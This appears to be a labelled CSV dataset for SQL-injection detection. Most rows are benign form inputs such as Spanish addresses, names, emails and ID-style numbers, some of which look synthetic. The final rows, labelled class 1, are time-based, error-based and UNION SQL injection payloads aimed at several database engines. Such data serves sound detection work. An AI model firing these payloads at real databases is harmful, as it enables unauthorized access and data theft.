index,payload,class
16635,schwuchow9@viajessolomujeres.bj,0
16636,santa maria de corc,0
16637,jamaal,0
16638,3.62E+15,0
16639,mccowen@esencialser.mn,0
16640,rastrilladora,0
16641,macinnes,0
16642,kit,0
16643,cr48e24n,0
16644,7387,0
16645,keer,0
16646,crespo bullones,0
16647,corazones 168,0
16648,vaillant altimir,0
16649,"calle mayor, s/n 11h",0
16650,8534,0
16651,18995930t,0
16652,pegler,0
16653,lerumeur@phd-photodecor.sj,0
16654,monsalve almada,0
16655,"fernandez latorre 14,",0
16656,c4nt0rn,0
16657,zein,0
16658,termmetro,0
16659,"c/ ereta, 104,",0
16660,6.91E+15,0
16661,sitiwet-chagas@creacionesacampada.travel,0
16662,3525,0
16663,"romana, la",0
16664,alysia,0
16665,1084,0
16666,pelle1@906.com.aq,0
16667,1.77E+15,0
16668,calle juan agui 97 9-e,0
16669,26562587w,0
16670,av. carlos marx s/n,0
16671,huelva,0
16672,completorio,0
16673,"concejo de alzuza, 47,",0
16674,49515,0
16675,grajera sampol,0
16676,sendra rull,0
16677,pimienta rosas,0
16678,"c/ ciudadela 188, 4?f",0
16679,mata hita,0
16680,sowry,0
16681,valls barri,0
16682,santa catalina 81,0
16683,open3,0
16684,con79lecimie91o,0
16685,cijuela,0
16686,karchevs,0
16687,91553356q,0
16688,briant,0
16689,clar gabarri,0
16690,73107657h,0
16691,"aljaraque 196, 11d",0
16692,musi@inmobiliariahangar.vn,0
16693,nurit,0
16694,adalino,0
16695,4.59E+15,0
16696,"calle diamante, 57",0
16697,agatn,0
16698,10332,0
16699,thieu,0
16700,gault-lovett@lunch.com.ga,0
16701,oroz-betelu,0
16702,serratosa@yiutuve.pe,0
16703,handal hach,0
16704,esser,0
16705,kubrick.blessed@suardistec.ee,0
16706,canciano,0
16707,85510378n,0
16708,piols padilla,0
16709,8l077ra,0
16710,4.43E+15,0
16711,cubillos del sil,0
16712,oxendine,0
16713,kalila,0
16714,"camio da mina, 175,",0
16715,winifred5,0
16716,alegra,0
16717,bayarri bach,0
16718,valdehorna,0
16719,2446e8t6da,0
16720,4.61E+15,0
16721,sadoc,0
16722,calle regimineto del sol 48 10e,0
16723,33279,0
16724,revesa,0
16725,strucak@cortell.cat,0
16726,5a69io99t3,0
16727,dolores ibarruri 75,0
16728,yalile,0
16729,9530,0
16730,48748000y,0
16731,colls messegu,0
16732,6.76E+15,0
16733,sazarina_logue@gay-tantra.lc,0
16734,yaci,0
16735,"infantes de carrion, 122",0
16736,nacer,0
16737,15142,0
16738,boes@cumbareback.kz,0
16739,"c/ padre ignacio ellaguria, 117 6-e",0
16740,"faus 195,",0
16741,llanes,0
16742,alfardilla,0
16743,"c/ secretario guedes aleman s/n,",0
16744,tiramollar,0
16745,pembrooke_coates@stainless.gd,0
16746,8.32E+15,0
16747,marylin,0
16748,grea,0
16749,dan,0
16750,45250,0
16751,1729,0
16752,03770036z,0
16753,"toril, 171 5h",0
16754,63947168s,0
16755,terland-bartha5@informatica2009.ck,0
16756,12370442f,0
16757,selwart@studentrooms.zr,0
16758,olmeda de la cuesta,0
16759,19294,0
16760,"c/ fernandez shaw, 177 1-e",0
16761,kuzz,0
16762,"arrasate 130,",0
16763,"c/ jose belso castao, s/n,",0
16764,"calle tajo, 182,",0
16765,cunillera penades,0
16766,bossa,0
16767,kirland-lincovsky@la-sexta-f1.fo,0
16768,d308ada,0
16769,iruraiz-gauna,0
16770,"carrer mestre albages 61,",0
16771,22533,0
16772,50629,0
16773,"calle santa apolonia, 47,",0
16774,8e6a74aer,0
16775,villarejo del valle,0
16776,9.45E+14,0
16777,pl9t1r4,0
16778,prdena del rincn,0
16779,15423399j,0
16780,3690,0
16781,33120,0
16782,3o7za732,0
16783,audadora,0
16784,alfa71ta,0
16785,5320,0
16786,68689912k,0
16787,estalell,0
16788,octagonal,0
16789,beasain,0
16790,thuswald,0
16791,vitacco,0
16792,46813,0
16793,50490,0
16794,rothamel,0
16795,norring-fujikawa@autoconstruccion.au,0
16796,mald,0
16797,p5li8e5i2,0
16798,robledillo de la jara,0
16799,81717068t,0
16800,93698052p,0
16801,d2s7sp79ro,0
16802,3549,0
16803,mullin@gopersonaltrainers.nr,0
16804,1.76E+15,0
16805,45025499d,0
16806,gaspard-birgel@indorec.kr,0
16807,arre,0
16808,"calle barrio villayuda 169,",0
16809,8888,0
16810,5.26E+15,0
16811,chmara@novolardiseno.ky,0
16812,13061311w,0
16813,lucena,0
16814,legris@beautifulbody.yu,0
16815,79564193v,0
16816,589ecialid6d,0
16817,1.08E+15,0
16818,avda. fernando ferrerio s/n,0
16819,"c/ barrio de recuesto, 195 6-h",0
16820,cojera,0
16821,2er7n9um43a,0
16822,portillo,0
16823,iocntrl,0
16824,43511,0
16825,4358,0
16826,san vicente de la cabeza,0
16827,5907,0
16828,nahuel,0
16829,4.98E+15,0
16830,ejarque barbieri,0
16831,e2paq48t282r,0
16832,12466,0
16833,ob7491,0
16834,"carrer asturies, 49",0
16835,youping,0
16836,lue39,0
16837,bestard,0
16838,colvin@freemachine.no,0
16839,retamal,0
16840,calle velardes s/n 1?e,0
16841,dalleto poroma,0
16842,9810,0
16843,23485,0
16844,7.95E+15,0
16845,93640511j,0
16846,p870en538r7,0
16847,grin,0
16848,closa ortell,0
16849,beiza ivanco,0
16850,6448,0
16851,8.99E+15,0
16852,disney,0
16853,63eb2ya,0
16854,denice,0
16855,1.27E+15,0
16856,7.12E+15,0
16857,18653468p,0
16858,haenning@maxitienda.be,0
16859,"calle ladera, 147 10-e",0
16860,58007817t,0
16861,"carretera de vista-rica s/n,",0
16862,41850,0
16863,37170,0
16864,quintina,0
16865,maggee,0
16866,artenio,0
16867,vries,0
16868,calle capitan palacios 71,0
16869,roze,0
16870,"calle juana ibarborou 134,",0
16871,3.71E+15,0
16872,ciro,0
16873,bularros,0
16874,laga_rtijo,0
16875,acre,0
16876,gonzales_thalasso@magadan.com.jm,0
16877,peabody,0
16878,booth,0
16879,"sant sever 63, 6-b",0
16880,294r1152ar,0
16881,rhett,0
16882,caine@albeiteria.es,0
16883,sabionda,0
16884,33s4h9929r,0
16885,96622444l,0
16886,93tip72ar,0
16887,"rodrigo caro, 165,",0
16888,75106972n,0
16889,ilya,0
16890,brogley,0
16891,latimer@puntodevistafotografia.ve,0
16892,40151,0
16893,0al5a4,0
16894,adlard@muebemiweb.ke,0
16895,3.24E+15,0
16896,7.52E+15,0
16897,"cabrera, 199",0
16898,1856,0
16899,mieres,0
16900,eric3@familiamarino.sh,0
16901,6e1ba,0
16902,22011041h,0
16903,"c/ ciutat freta, 37",0
16904,lenhart8@raullazaro.us,0
16905,vingelli9@custombikesclothes.fr,0
16906,stephen,0
16907,despacha!do,0
16908,9.77E+15,0
16909,milionario.kirkham@programa-gestion-erp.mil,0
16910,c/ maria zayas de sotomayor 18,0
16911,humfrid,0
16912,"llobregat 130,",0
16913,superable,0
16914,"calle san isidro labrador 188, 13?h",0
16915,febrido,0
16916,d9s1a1i89,0
16917,recomendaci$n,0
16918,roboracin,0
16919,00207473j,0
16920,levisky,0
16921,julieta,0
16922,46842,0
16923,"c/ benasau, 196, 10?h",0
16924,tijerin monaghan,0
16925,walter,0
16926,cenicientos,0
16927,ag2u7a,0
16928,alfonso,0
16929,zahira,0
16930,ardevol herrador,0
16931,3372,0
16932,paley,0
16933,18452,0
16934,gloria,0
16935,rego,0
16936,taciano,0
16937,"alcalde lopez rancao, 194, 3-e",0
16938,nichol,0
16939,15553,0
16940,pueblica de valverde,0
16941,cremades@baltasarsantos.kn,0
16942,64556150a,0
16943,malen,0
16944,robby7,0
16945,philips@davidymamen.sa,0
16946,8029,0
16947,madisett,0
16948,meeks,0
16949,marciniu,0
16950,6.72E+15,0
16951,azorin 35 1b,0
16952,albertini_trauberg@theroxyblue.jo,0
16953,yudin,0
16954,atontamiento,0
16955,maurilio,0
16956,"calle perez galdos 193,",0
16957,5.77E+14,0
16958,japan,0
16959,inobediecia,0
16960,deli6escenci1,0
16961,charissa,0
16962,57727237c,0
16963,nada,0
16964,yuraj,0
16965,scheppan-ishikawa@tuslimites.ly,0
16966,im$ponderable,0
16967,4661,0
16968,9.20E+15,0
16969,0orru6t5,0
16970,salina-sonajew@almeriastella.vg,0
16971,8.42E+15,0
16972,theo,0
16973,mareah,0
16974,nolberto,0
16975,azuqueca de henares,0
16976,04492457m,0
16977,"licenciado gonzalez garcia, 170 11d",0
16978,romanones,0
16979,"el provencio, 6 8f",0
16980,5695,0
16981,37159,0
16982,34578974s,0
16983,7242,0
16984,alar1ado0,0
16985,dieasl_yannatos@vilainstal.coop,0
16986,2308,0
16987,2080,0
16988,ticona,0
16989,81568460h,0
16990,59137152n,0
16991,31594,0
16992,scotty,0
16993,em+buchada,0
16994,mangot barra,0
16995,roldan,0
16996,r3nci8l5so,0
16997,carpool,0
16998,5.77E+14,0
16999,calafell palmieri,0
17000,cunanan,0
17001,20654328y,0
17002,nadina,0
17003,"passeig bosc, 157",0
17004,mario,0
17005,tarragona,0
17006,52930776w,0
17007,canales,0
17008,cintio,0
17009,5.35E+15,0
17010,oreste,0
17011,kazuo,0
17012,07u8e37ia,0
17013,brokaw,0
17014,64sfa4imiento,0
17015,5.89E+15,0
17016,embargad!o,0
17017,3.89E+15,0
17018,9.92E+14,0
17019,"quintana 19, 13f",0
17020,"c/ cerro, 87 2?b",0
17021,"paseo francisco mir berlanga 141, 12-e",0
17022,7.69E+15,0
17023,"masroig, el",0
17024,18129,0
17025,acabadamente,0
17026,14480,0
17027,tauja,0
17028,remax ondetti,0
17029,3789,0
17030,ma$c3donio,0
17031,roberto,0
17032,hutchins@foreignoffice.sa,0
17033,46725,0
17034,finak,0
17035,85765253r,0
17036,18684547z,0
17037,8.94E+14,0
17038,38847166m,0
17039,8.76E+15,0
17040,acachorrar,0
17041,"sol, 153",0
17042,laycock_faulds@peaf.sd,0
17043,11539856c,0
17044,hedda,0
17045,29611,0
17046,"calle prat de la riba, 73",0
17047,24892,0
17048,weldon@latiendadecolchones.ec,0
17049,9.32E+15,0
17050,bond@tomorrow.com.hk,0
17051,91436910l,0
17052,princep muntadas,0
17053,6703,0
17054,6131,0
17055,7.06E+15,0
17056,malleson_varney@tomorrow.com.cz,0
17057,alcalde manuel de la pinta s/n 13?f,0
17058,229669a3a,0
17059,qunola,0
17060,fuentes claras,0
17061,saturnina,0
17062,roncha,0
17063,heintje0@alpesfranceses.com.ro,0
17064,e41t8r,0
17065,69634179t,0
17066,schoelen.boswell@phd-photodecor.ca,0
17067,graciano,0
17068,d9str7par,0
17069,mundy,0
17070,37796,0
17071,8.23E+15,0
17072,oretana,0
17073,al9ol,0
17074,3.07E+15,0
17075,mosegui bofill,0
17076,28295,0
17077,mohar@ropadegolf.gg,0
17078,28614822q,0
17079,martens@ajuntamentbarcelona2-0.tl,0
17080,yaiti,0
17081,1490,0
17082,"de santiago carrillo solares 67, 8-f",0
17083,43791,0
17084,2331,0
17085,vilassar de mar,0
17086,najli,0
17087,"calle piles, 190",0
17088,henry,0
17089,20100,0
17090,talavera,0
17091,25480,0
17092,53238791r,0
17093,"avenida baraain, 51, 1?h",0
17094,45789,0
17095,asander1@nutrimama.do,0
17096,21924971z,0
17097,prell@davidymamen.tc,0
17098,pinela,0
17099,beato,0
17100,victorino,0
17101,aldeanueva de santa cruz,0
17102,androlo,0
17103,7.14E+15,0
17104,lantarn,0
17105,bujaraloz,0
17106,brazzel1@castigadas.am,0
17107,pampa,0
17108,fredesvinda,0
17109,carretera rubi 106,0
17110,carol,0
17111,"c/ nueva fuera, 139 3?g",0
17112,marginet,0
17113,colunga corrius,0
17114,15807509t,0
17115,pannequin@repretexbcn.gl,0
17116,lacruz morey,0
17117,caputo,0
17118,fabiano,0
17119,rond,0
17120,"calle bruno ayllon, 142, 3?c",0
17121,simplemente,0
17122,contrariosa,0
17123,c/ auroros 173,0
17124,c/ sant gonal 166 9-b,0
17125,34886,0
17126,chrysa2,0
17127,standfor,0
17128,moretti alegre,0
17129,95868852e,0
17130,zoq3et1r8,0
17131,"doctor ramon sanchez-parra, 17 11?d",0
17132,trampeador,0
17133,6.16E+15,0
17134,shihhai0,0
17135,parkin,0
17136,dowser,0
17137,marcelo,0
17138,desortija0a,0
17139,51993302p,0
17140,5.16E+15,0
17141,baxie,0
17142,veracruz,0
17143,"calle garci-perez 41, 9?c",0
17144,mud6787t6,0
17145,renata,0
17146,mebine,0
17147,vicente,0
17148,7aria22,0
17149,juglandea,0
17150,"c/ madrid, 53 5-f",0
17151,0nsu2iso,0
17152,orce,0
17153,tris2,0
17154,petruck,0
17155,36677303p,0
17156,swaden,0
17157,arine,0
17158,25244,0
17159,33371147x,0
17160,cooksey,0
17161,cuarentona,0
17162,hiplita,0
17163,graupere trabucco,0
17164,rebes huasequi,0
17165,tosigoso,0
17166,"calle rio piguea, 5,",0
17167,cohn.of@evasor.ch,0
17168,16582,0
17169,99431698f,0
17170,gurica4,0
17171,on,0
17172,saiz,0
17173,bacio bonnin,0
17174,vir7eino,0
17175,gavald,0
17176,"calle salvador de madariaga s/n,",0
17177,martn miguel,0
17178,29283698y,0
17179,84996241v,0
17180,calle villa de andorra 36 9?b,0
17181,vitalia,0
17182,polit lauli,0
17183,1478,0
17184,80819303v,0
17185,3.82E+14,0
17186,elysha,0
17187,crabe,0
17188,"calle sol s/n,",0
17189,macedonia 48,0
17190,niel5,0
17191,quilolitr-o,0
17192,genvieve,0
17193,guerra_russinov@weat.fj,0
17194,austriaca,0
17195,"calle valsendero, 48,",0
17196,46824,0
17197,adolphe,0
17198,06226784v,0
17199,su6sc87u23r,0
17200,enco,0
17201,.corporativo,0
17202,belia,0
17203,robelo@moviels.me,0
17204,5.18E+15,0
17205,52943030c,0
17206,29807509s,0
17207,"c/ afluente, 82",0
17208,harshad,0
17209,alegre nomdedeu,0
17210,l5r78gea,0
17211,edelmar,0
17212,8.26E+15,0
17213,letha,0
17214,pente@maxitienda.ms,0
17215,"calle juan de uceda, 180,",0
17216,6ncanta33n,0
17217,1.86E+15,0
17218,adaiana,0
17219,jehovah,0
17220,muriel de la fuente,0
17221,aranguren de jaime,0
17222,delmo,0
17223,kofoed@serviconlevante.mr,0
17224,rurick5,0
17225,7406,0
17226,56359685w,0
17227,natver,0
17228,cresta-da,0
17229,general ricardos 187,0
17230,vispy,0
17231,9639,0
17232,15953,0
17233,navarra,0
17234,cobo,0
17235,2813,0
17236,"c/ madre castisima, s/n",0
17237,calle jeremias 14 7b,0
17238,45908,0
17239,arena@productosgarantizados.uy,0
17240,gunner@piaceredelivery.kw,0
17241,2055,0
17242,cholewin,0
17243,benalup-casas viejas,0
17244,mclendon,0
17245,fonterosa vjar,0
17246,cervantes,0
17247,"plaza de el salvador 91,",0
17248,banderizar,0
17249,5.01E+15,0
17250,82380804w,0
17251,darbanville@chicasdiabolo.tr,0
17252,3615,0
17253,aguarn,0
17254,franza,0
17255,enratonarse,0
17256,urbon,0
17257,cath,0
17258,51518357j,0
17259,8.39E+15,0
17260,idelfonsa,0
17261,43595,0
17262,caruth5@wave.com.pt,0
17263,97649797p,0
17264,destriana,0
17265,tubalcan,0
17266,obdulio,0
17267,9640,0
17268,9.46E+15,0
17269,ed,0
17270,p0n64793a,0
17271,salma,0
17272,"praza madre lestonnac, s/n",0
17273,nedar,0
17274,barlas,0
17275,1.62E+15,0
17276,"calle romeral, 143, 7?h",0
17277,dormer,0
17278,boca de hurgano,0
17279,castell de rugat,0
17280,6.53E+15,0
17281,shing-mi,0
17282,e00u4rda2,0
17283,ninon,0
17284,aldebar,0
17285,jiyuan,0
17286,"vinyals, 117 4?e",0
17287,tors,0
17288,andara francino,0
17289,1.50E+15,0
17290,gullera,0
17291,eisenberg@muchochinoenchina.mx,0
17292,80876345l,0
17293,amber,0
17294,vallado oliveras,0
17295,5.13E+14,0
17296,3180,0
17297,46630334l,0
17298,5866,0
17299,zarpanel,0
17300,8.01E+15,0
17301,staton,0
17302,3.31E+15,0
17303,ninn,0
17304,boimorto,0
17305,2.64E+15,0
17306,1.35E+15,0
17307,tapinga,0
17308,9ei91n,0
17309,vall de ebo,0
17310,1.03E+15,0
17311,retasac5n,0
17312,"moncayo 46,",0
17313,3.60E+15,0
17314,alfamn,0
17315,navalvillar de ibor,0
17316,shrum@uniovivirtual.nz,0
17317,"c/ mineria, 151 13?g",0
17318,santa eulalia de gllego,0
17319,komarov@docerosas.dk,0
17320,lilah,0
17321,18l4et2ro,0
17322,16802646l,0
17323,malia,0
17324,65886361d,0
17325,geffner-schoo@bacoespecialseleccin.bm,0
17326,eberto,0
17327,c4l6716o,0
17328,alvino,0
17329,carbajosa de la sagrada,0
17330,asacadora,0
17331,5.96E+15,0
17332,"lapa, la",0
17333,vanera,0
17334,42855301e,0
17335,ilsup,0
17336,6ar10l30,0
17337,aira vials,0
17338,quintino,0
17339,marice,0
17340,26707809w,0
17341,06918701w,0
17342,beterette estruga,0
17343,talens zumalacrregui,0
17344,30034324g,0
17345,8.91E+14,0
17346,bowen-gugolka@soyriojano.name,0
17347,anglaril,0
17348,filomena,0
17349,maraa,0
17350,samanieg mitteenn,0
17351,velen,0
17352,brenna,0
17353,26774865j,0
17354,aldearrodrigo,0
17355,zazulak,0
17356,ruiloba,0
17357,amann 132,0
17358,"plza. pedagogo pestalozzi, 157, 6?d",0
17359,g1ne136,0
17360,19338,0
17361,dottin,0
17362,25585710g,0
17363,junette6,0
17364,valcarcel,0
17365,raimulfo,0
17366,85624451m,0
17367,cegajoso,0
17368,tanglao,0
17369,adashevsky@theroxyblue.com,0
17370,chistiakov@zytechwind.ke,0
17371,8328,0
17372,62120654t,0
17373,6.34E+15,0
17374,banyeres del peneds,0
17375,81470918l,0
17376,farmacoplica,0
17377,58743816e,0
17378,c/ marquesa de vilallonga 53 5f,0
17379,callosar,0
17380,1.28E+15,0
17381,"c/ valtravieso s/n,",0
17382,sarmiento,0
17383,wahlberg8@am-si.np,0
17384,vinaixa calleiros,0
17385,cadek,0
17386,38948590e,0
17387,murad@magadan.org.pe,0
17388,ferrandez cabaas,0
17389,2.02E+15,0
17390,acr7m6nia,0
17391,kaycee,0
17392,knight_freihart@tresbrujas.qa,0
17393,"cami terminal s/n,",0
17394,8.84E+15,0
17395,8693,0
17396,massimo,0
17397,vies canales,0
17398,kenta1,0
17399,4.29E+15,0
17400,"c/ juan de bustamante, 30, 10b",0
17401,metrics,0
17402,guango,0
17403,"pl. limeo 22, 5?e",0
17404,canje,0
17405,garladora,0
17406,31243,0
17407,paterson,0
17408,51285362p,0
17409,7u6can*i2a04n,0
17410,paulovic,0
17411,addons,0
17412,"c/ torre, 151, 9?b",0
17413,bertilia,0
17414,boothe,0
17415,72094500b,0
17416,nobuo,0
17417,almcita,0
17418,4ip7237o8h2dira,0
17419,lucio,0
17420,coca artero,0
17421,pardos@barcafedaniss.co,0
17422,16124624z,0
17423,d012965226m6ent0,0
17424,irina,0
17425,schaafsma@gay-tantra.sj,0
17426,shanta,0
17427,urkiaga,0
17428,elian,0
17429,messenger@blanquillos.pk,0
4156,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",1
4157,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,1
4158,"-6766"" where 6591  =  6591 or make_set  (  9354  =  9354,7185  )  --",1
4159,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",1
4160,-7610' or 3038  =  3038,1
4161,1'||  (  select 'gmkp' where 6016  =  6016,1
4162,"1,  (  case when 6620  =  3092 then 1 else null end  )  ",1
4163,"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1
4164,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1
4165,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",1
4166,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1
4167,"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1
4168,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1
4169,"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
4170,"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",1
4171,-6190'   )    )     )   union all select 9413--,1
4172,"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
4173,"-4653' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
4174,1'   )    )    and 6690  =  3250#,1
4175, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',1
4176,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1
4177,select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 0  )   end  )  --,1
4178,-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1
4179,"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 0 end  )   limit 1--",1
4180,"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",1
4181,"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
4182,"-5591%""   )    )    order by 1--",1
4183,1'  )   where 4949  =  4949,1
4184,"1""   )    )    as sqow where 8752  =  8752",1
4185,"1  )   where 8008  =  8008 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
4186,"1""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
4187,"1""  )   as frmp where 6073  =  6073",1
4188,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1
